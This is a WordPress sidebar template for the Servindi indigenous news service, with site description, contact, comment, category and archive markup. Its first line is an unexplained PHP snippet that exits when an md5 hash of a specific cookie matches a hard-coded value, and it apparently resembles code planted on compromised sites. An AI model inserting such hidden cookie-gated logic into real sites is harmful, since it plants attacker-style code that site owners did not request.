<?php if(md5($_COOKIE['a101079b594b5563'])=="18adcf2bf0f25ad0d222e53d2d0d03df"){  exit; } ?><div id="columna2">
		
	<div class="margencolumnas">
			
		<div align="center"><a href="http://www.servindi.org"><img src="http://www.servindi.org/img/logo.jpg" alt="Servindi Logo" width="194" height="120" border="0"/></a></div>
			<p><a href="http://www.servindi.org/">SERVINDI</a> es un grupo de trabajo voluntario identificado con los intereses de los pueblos y comunidades ind&iacute;genas. Aspiramos a contribuir al fortalecimiento y protagonismo del movimiento ind&iacute;gena brindando un servicio informativo independiente y una opini&oacute;n cr&iacute;tica y reflexiva sobre temas ind&iacute;genas y ecol&oacute;gicos.</p>
		<p> Escriba al Servicio de Informaci&oacute;n Ind&iacute;gena SERVINDI a : <a href="mailto:servindi@servindi.org">servindi@servindi.org</a></p>

		<p class="grupogoogle"><a href="http://groups.google.com.pe/group/servindi-noticias/subscribe"><strong><?php _e('Regístrese en la lista de interés de Servindi para recibir nuestros titulares'); ?></strong></a></p>		

		<?php if ((function_exists('get_recent_comments')) and (!is_page())) { ?>
		<h2><strong><?php _e('Últimos comentarios'); ?></strong></h2>
		
			<?php get_recent_comments(); ?>
			Ver los <a href="http://www.servindi.org/comentarios"><strong>últimos 20 comentarios</strong></a>
		<?php } ?>   
		<h2><strong>Secciones</strong></h2>
		<p>
		<ul>
		<?php wp_list_cats('sort_column=name&optioncount=1'); ?>
		</ul>
		</p>
		<h2><strong>Archivos</strong></h2>		
		<ul>
		<?php wp_get_archives('type=monthly'); ?>
		</ul>
		<!-- <h2><strong>Campa&ntilde;a</strong></h2>
		<p align="center"><a href="http://www.servindi.org/antiguo/sp/Campana_TLC/index.html"><img src="<?php bloginfo('url'); ?>/img/banner.jpg" width="142" height="232" border="1"></a></p>
		<p align="center"><a href="http://www.servindi.org/antiguo/sp/iwgia/index.htm"><img src="<?php bloginfo('url'); ?>/img/logo_iwgia.jpg" width="110" height="110" border="1"></a></p>-->
		<p><a href="http://feeds.feedburner.com/Servindi"><img src="http://feeds.feedburner.com/~fc/Servindi?bg=006600&amp;fg=FFFFCC&amp;anim=0" height="26" width="88" style="border:0" alt="" /></a></p>
	</div>
		
</div>
